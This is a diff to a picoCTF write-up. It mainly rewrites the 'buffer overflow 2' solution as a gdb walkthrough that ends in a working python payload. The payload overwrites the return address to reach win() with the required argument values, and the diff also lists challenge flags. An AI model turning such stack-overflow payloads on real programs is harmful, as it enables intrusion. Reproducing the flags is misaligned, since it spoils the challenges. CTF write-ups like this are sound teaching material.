@@ -65,12 +65,12 @@ Title                                                                      | Cat
 [What's My Name?             ](#forensics-250-whats-my-name)               | Forensics        | 250    | `picoCTF{w4lt3r_wh1t3_2d6d3c6c75aa3be7f42debed8ad16e3b}`
 [absolutely relative         ](#general-skills-250-absolutely-relative)    | General          | 250    | `picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e}`
 [assembly-2                  ](#reversing-250-assembly-2)                  | Reversing        | 250    | `0x188`
-[buffer overflow 2           ](#binary-exploitation-250-buffer-overflow-2) | Binary           | 250    |
+[buffer overflow 2           ](#binary-exploitation-250-buffer-overflow-2) | Binary           | 250    | `picoCTF{addr3ss3s_ar3_3asy1b78b0d8}`
 [caesar cipher 2             ](#cryptography-250-caesar-cipher-2)          | Crypto           | 250    | `picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}`
 [got-2-learn-libc            ](#binary-exploitation-250-got-2-learn-libc)  | Binary           | 250    |
 [rsa-madlibs                 ](#cryptography-250-rsa-madlibs)              | Crypto           | 250    | `picoCTF{d0_u_kn0w_th3_w@y_2_RS@_5d383e10}`
 [in out error                ](#general-skills-275-in-out-error)           | General          | 275    | `picoCTF{p1p1ng_1S_4_7h1ng_b6f5a788}`
-[Artisinal Handcrafted HTTP 3](#web-exploitation-300-artisinal-handcrafted-http-3) | Web     | 300    | `picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2}`
+[Artisinal Handcrafted HTTP 3](#web-exploitation-300-artisinal-handcrafted-http-3) | Web      | 300    | `picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_72f2}`
 [SpyFi                       ](#cryptography-300-spyfi)                    | Crypto           | 300    | `picoCTF{@g3nt6_1$_th3_c00l3$t_3355197}`
 [echooo                      ](#binary-exploitation-300-echooo)            | Binary           | 300    | `picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}`
 [learn gdb                   ](#general-skills-300-learn-gdb)              | General          | 300    | `picoCTF{gDb_iS_sUp3r_u53fuL_66d5464d}`
@@ -2490,64 +2490,178 @@ Looking at the dump of vuln, it is suggested to me that we should want to contro
 
 After much experimentation remembered how metasploit does it, by inserting the alphabet and mapping that back to points that are interesting to control.
 
+We'll debug this locally to start with for convenience. Touch a `flag.txt` and fill with a fake 'flag' that you'll 'discover'.
+
 ```
-$ gdb vuln
+$ python -c "print('a' * 112 + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')" > tmp
+$ echo "picoCTF{fake_flag}" > flag.txt
+$ gdb writeupfiles/vuln-buff-overflow-2
 ...
 (gdb) break vuln
 Breakpoint 1 at 0x804864c
+(gdb) disas
+Dump of assembler code for function vuln:
+   0x08048646 <+0>:     push   ebp
+   0x08048647 <+1>:     mov    ebp,esp
+   0x08048649 <+3>:     sub    esp,0x78
+=> 0x0804864c <+6>:     sub    esp,0xc
+   0x0804864f <+9>:     lea    eax,[ebp-0x6c]
+   0x08048652 <+12>:    push   eax
+   0x08048653 <+13>:    call   0x8048430 <gets@plt>
+   0x08048658 <+18>:    add    esp,0x10
+   0x0804865b <+21>:    sub    esp,0xc
+   0x0804865e <+24>:    lea    eax,[ebp-0x6c]
+   0x08048661 <+27>:    push   eax
+   0x08048662 <+28>:    call   0x8048460 <puts@plt>
+   0x08048667 <+33>:    add    esp,0x10
+   0x0804866a <+36>:    nop
+   0x0804866b <+37>:    leave
+   0x0804866c <+38>:    ret
+End of assembler dump.
+(gdb) break *0x0804866c
+Haltepunkt 2 at 0x804866c
+(gdb) continue
+Continuing.
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+Breakpoint 2, 0x0804866c in vuln ()
+(gdb) disas
+Dump of assembler code for function vuln:
+   0x08048646 <+0>:     push   ebp
+   0x08048647 <+1>:     mov    ebp,esp
+   0x08048649 <+3>:     sub    esp,0x78
+   0x0804864c <+6>:     sub    esp,0xc
+   0x0804864f <+9>:     lea    eax,[ebp-0x6c]
+   0x08048652 <+12>:    push   eax
+   0x08048653 <+13>:    call   0x8048430 <gets@plt>
+   0x08048658 <+18>:    add    esp,0x10
+   0x0804865b <+21>:    sub    esp,0xc
+   0x0804865e <+24>:    lea    eax,[ebp-0x6c]
+   0x08048661 <+27>:    push   eax
+   0x08048662 <+28>:    call   0x8048460 <puts@plt>
+   0x08048667 <+33>:    add    esp,0x10
+   0x0804866a <+36>:    nop
+   0x0804866b <+37>:    leave
+=> 0x0804866c <+38>:    ret
+End of assembler dump.
+(gdb) p/x $esp
+$1 = 0xffffcbdc
+(gdb) p/x *((int)$esp)
+$2 = 0x44434241
+```
+
+We'll return to whatever is in $esp, so we just need to overwrite ABCD with the
+address we'd like to return to. We know we need to jump to `win`, we can find
+the address via objdump or just running `disas win` in gdb and copying the
+first byte.
+
+```
+$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGHIJKLMNOPQRSTUVWXYZ')" > tmp
+```
+
+This time we know we'll enter the `win` function so we can just break there:
+
+```
 (gdb) break win
-Breakpoint 2 at 0x80485d1
-(gdb) run
-Starting program: /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln
+Haltepunkt 1 at 0x80485d1
+(gdb) run < tmp
+Starting program: writeupfiles/vuln-buff-overflow-2 < tmp
 Please enter your string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaEFGHIJKLMNOPQRSTUVWXYZ
 
-Breakpoint 1, 0x0804864c in vuln ()
-(gdb) step
-Single stepping until exit from function vuln,
-which has no line number information.
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijklmnopqrstuvwxyz
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijklmnopqrstuvwxyz
-Warning:
-Cannot insert breakpoint 0.
-Cannot access memory at address 0x73727170
-
-0x6f6e6d6c in ?? ()
+Breakpoint 1, 0x080485d1 in win ()
+(gdb) disas
+Dump of assembler code for function win:
+   0x080485cb <+0>:     push   ebp
+   0x080485cc <+1>:     mov    ebp,esp
+   0x080485ce <+3>:     sub    esp,0x58
+=> 0x080485d1 <+6>:     sub    esp,0x8
+   0x080485d4 <+9>:     push   0x8048750
+   0x080485d9 <+14>:    push   0x8048752
+   0x080485de <+19>:    call   0x80484a0 <fopen@plt>
+   0x080485e3 <+24>:    add    esp,0x10
+   0x080485e6 <+27>:    mov    DWORD PTR [ebp-0xc],eax
+   0x080485e9 <+30>:    cmp    DWORD PTR [ebp-0xc],0x0
+   0x080485ed <+34>:    jne    0x8048609 <win+62>
+   0x080485ef <+36>:    sub    esp,0xc
+   0x080485f2 <+39>:    push   0x804875c
+   0x080485f7 <+44>:    call   0x8048460 <puts@plt>
+   0x080485fc <+49>:    add    esp,0x10
+   0x080485ff <+52>:    sub    esp,0xc
+   0x08048602 <+55>:    push   0x0
+   0x08048604 <+57>:    call   0x8048470 <exit@plt>
+   0x08048609 <+62>:    sub    esp,0x4
+   0x0804860c <+65>:    push   DWORD PTR [ebp-0xc]
+   0x0804860f <+68>:    push   0x40
+   0x08048611 <+70>:    lea    eax,[ebp-0x4c]
+   0x08048614 <+73>:    push   eax
+   0x08048615 <+74>:    call   0x8048440 <fgets@plt>
+   0x0804861a <+79>:    add    esp,0x10
+   0x0804861d <+82>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
+   0x08048624 <+89>:    jne    0x8048640 <win+117>
+   0x08048626 <+91>:    cmp    DWORD PTR [ebp+0xc],0xdeadc0de
+   0x0804862d <+98>:    jne    0x8048643 <win+120>
+   0x0804862f <+100>:   sub    esp,0xc
+   0x08048632 <+103>:   lea    eax,[ebp-0x4c]
+   0x08048635 <+106>:   push   eax
+   0x08048636 <+107>:   call   0x8048420 <printf@plt>
+   0x0804863b <+112>:   add    esp,0x10
+   0x0804863e <+115>:   jmp    0x8048644 <win+121>
+   0x08048640 <+117>:   nop
+   0x08048641 <+118>:   jmp    0x8048644 <win+121>
+   0x08048643 <+120>:   nop
+   0x08048644 <+121>:   leave
+   0x08048645 <+122>:   ret
+End of assembler dump.
 ```
 
-Ok, so in this string:
+Let's break right before the comparisons happen just in case ebp is modified anywhere.
 
 ```
-<snip>bcdefghijklmnopqrstuvwxyz
-                \||/\||/
-             0x6c-6f ||
-                    ^^^^
-                 0x70-73
+(gdb) break *0x0804861a
+Haltepunkt 2 at 0x804861a
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x0804861a in win ()
 ```
 
-So we write garbage up to `j` and end at `t`. positions `l`-`o` are where it will return to, and positions `p`-`s` need deadbeef/deadcode.
+And looking into those we see:
 
 ```
-python -c "print('a' * 112 + '\xcb\x85\x04\x08\xef\xbe\xad\xde\xde\xc0\xad\xde')"  > ~/ffff
-$ gdb vuln
-...
-(gdb) run < ~/ffff
-Starting program: /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln < ~/ffff
+(gdb) p/x *((int)$ebp + 0x8)
+$1 = 0x4c4b4a49  # LKJI
+(gdb) p/x *((int)$ebp + 0xc)
+$2 = 0x504f4e4d  # PONM
+```
+
+So we'll just overwrite those now:
+
+
+```
+$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGH' + '\xef\xbe\xad\xde\xde\xc0\xad\xde')" | ./writeupfiles/vuln-buff-overflow-2
 Please enter your string:
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
-Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
-[Inferior 1 (process 1486044) exited normally]
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
+picoCTF{test flag}
+[1]    12928 done                              python -c  |
+       12929 segmentation fault (core dumped)  ./writeupfiles/vuln-buff-overflow-2
 ```
 
-So that works perfectly (in that it complains of a missing flag, it successfully entered the `win` function.) However running the same thing outside of gdb, fails:
+So that works perfectly
 
 ```
-$ ./vuln < ~/ffff
+$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGH' + '\xef\xbe\xad\xde\xde\xc0\xad\xde')" | ./vuln
 Please enter your string:
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
-Segmentation fault
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
+picoCTF{addr3ss3s_ar3_3asy1b78b0d8}  Segmentation fault (core dumped)
 ```
 
-Which is quite unexpected.
+Which is just what we wanted
+
+**Flag**
+```
+picoCTF{addr3ss3s_ar3_3asy1b78b0d8}
+```
 
 
 ## Cryptography 250: caesar cipher 2
